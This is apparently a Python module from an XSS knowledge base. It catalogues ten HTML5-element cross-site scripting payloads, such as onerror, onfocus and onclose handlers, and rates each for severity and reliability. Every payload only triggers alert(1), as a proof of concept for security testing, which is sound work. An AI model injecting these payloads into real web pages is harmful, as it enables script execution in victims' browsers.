#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

HTML5 Element XSS Payloads
"""

from ..models import PayloadEntry


HTML5_PAYLOADS = {
    "html5_1": PayloadEntry(
        payload="<video poster=javascript:alert(1)//></video>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Video poster javascript (limited)",
        tags=["html5", "video", "poster"],
        reliability="low",
    ),
    "html5_2": PayloadEntry(
        payload="<input type=image src=x onerror=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Input image type onerror",
        tags=["html5", "input", "image"],
        reliability="high",
    ),
    "html5_3": PayloadEntry(
        payload="<keygen autofocus onfocus=alert(1)>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Keygen autofocus (deprecated)",
        tags=["html5", "keygen", "deprecated"],
        reliability="low",
    ),
    "html5_4": PayloadEntry(
        payload="<meter onmouseover=alert(1)>test</meter>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Meter element with event",
        tags=["html5", "meter"],
        reliability="high",
    ),
    "html5_5": PayloadEntry(
        payload="<progress onmouseover=alert(1)>test</progress>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Progress element with event",
        tags=["html5", "progress"],
        reliability="high",
    ),
    "html5_6": PayloadEntry(
        payload="<output ondblclick=alert(1)>test</output>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Output element with event",
        tags=["html5", "output"],
        reliability="high",
    ),
    "html5_7": PayloadEntry(
        payload="<picture><source srcset=x onerror=alert(1)><img></picture>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Picture source onerror",
        tags=["html5", "picture", "source"],
        reliability="high",
    ),
    "html5_8": PayloadEntry(
        payload="<slot onslotchange=alert(1)></slot>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Slot element onslotchange",
        tags=["html5", "slot", "web-components"],
        reliability="medium",
    ),
    "html5_9": PayloadEntry(
        payload="<dialog onclose=alert(1) open>test</dialog>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Dialog onclose event",
        tags=["html5", "dialog"],
        reliability="high",
    ),
    "html5_10": PayloadEntry(
        payload="<menu id=x><menuitem label=test onclick=alert(1)></menuitem></menu>",
        contexts=["html_content"],
        severity="high",
        cvss_score=7.0,
        description="Menuitem onclick (Firefox)",
        tags=["html5", "menu", "menuitem"],
        browser_support=["firefox"],
        reliability="low",
    ),
}

HTML5_PAYLOADS_TOTAL = len(HTML5_PAYLOADS)
